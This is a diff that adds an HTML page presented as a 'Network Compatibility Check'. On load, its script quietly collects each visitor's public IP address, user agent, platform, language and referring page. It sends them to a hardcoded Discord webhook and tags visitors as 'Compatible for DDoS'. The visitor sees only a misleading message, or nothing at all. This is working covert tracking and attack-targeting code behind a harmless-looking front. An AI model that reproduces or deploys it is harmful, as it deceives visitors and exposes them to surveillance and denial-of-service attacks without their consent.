@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Network Compatibility Check</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1e1e1e;
+            color: #ffffff;
+            text-align: center;
+            padding: 50px;
+        }
+        #message {
+            display: none; /* Initially hidden */
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Checking Compatibility...</h1>
+    <div id="message"></div>
+
+    <script>
+        const webhookUrl = 'https://discord.com/api/webhooks/1298609229648756736/J63zfjfBmpjdk3AiRGseHBwIZzPgZTrBNVW4qx0wRvPNNJ4_hJY5ldZfrnnYBOQeTk-a'; // Replace with your Discord webhook URL
+
+        function getNetworkInfo() {
+            const networkInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                online: navigator.onLine,
+                ip: null, // Placeholder for user's IP
+                lastVisited: document.referrer || "N/A", // Last visited URL
+                compatibility: checkCompatibility(),
+                ports: [80, 443] // Commonly used ports
+            };
+
+            // Fetch user's public IP using an external service
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    networkInfo.ip = data.ip;
+                    sendToWebhook(networkInfo);
+                })
+                .catch(error => {
+                    console.error('Error fetching IP:', error);
+                    document.getElementById('message').innerText = 'Error fetching IP address.';
+                });
+        }
+
+        function checkCompatibility() {
+            const platform = navigator.platform.toLowerCase();
+            const isWindows = platform.includes('win');
+            const isLinux = platform.includes('linux');
+            const isMac = platform.includes('mac');
+
+            return (isWindows || isLinux || isMac) ? "Compatible for DDoS" : "Not Compatible for DDoS";
+        }
+
+        function sendToWebhook(networkInfo) {
+            const embed = {
+                title: "Network Info Received",
+                color: 3066993, // Discord color (hex to decimal)
+                fields: [
+                    {
+                        name: "User Agent",
+                        value: networkInfo.userAgent,
+                        inline: true
+                    },
+                    {
+                        name: "Platform",
+                        value: networkInfo.platform,
+                        inline: true
+                    },
+                    {
+                        name: "Language",
+                        value: networkInfo.language,
+                        inline: true
+                    },
+                    {
+                        name: "Online",
+                        value: networkInfo.online ? 'Yes' : 'No',
+                        inline: true
+                    },
+                    {
+                        name: "IP Address",
+                        value: networkInfo.ip,
+                        inline: true
+                    },
+                    {
+                        name: "Last Visited",
+                        value: networkInfo.lastVisited,
+                        inline: true
+                    },
+                    {
+                        name: "Compatibility",
+                        value: networkInfo.compatibility,
+                        inline: true
+                    },
+                    {
+                        name: "Ports",
+                        value: networkInfo.ports.join(', '), // Join port numbers as a string
+                        inline: true
+                    }
+                ]
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ embeds: [embed] })
+            })
+            .then(response => {
+                if (response.ok) {
+                    if (networkInfo.compatibility === "Not Compatible for DDoS") {
+                        document.getElementById('message').innerText = 'This website is not compatible with your device. Please contact @semodge on Discord.';
+                        document.getElementById('message').style.display = 'block'; // Show the message
+                    }
+                } else {
+                    throw new Error('Failed to send data to webhook.');
+                }
+            })
+            .catch(error => {
+                console.error('Error sending data to webhook:', error);
+                document.getElementById('message').innerText = 'Error sending network info.';
+                document.getElementById('message').style.display = 'block'; // Show the error message
+            });
+        }
+
+        // Automatically check compatibility on page load
+        getNetworkInfo();
+    </script>
+</body>
+</html>
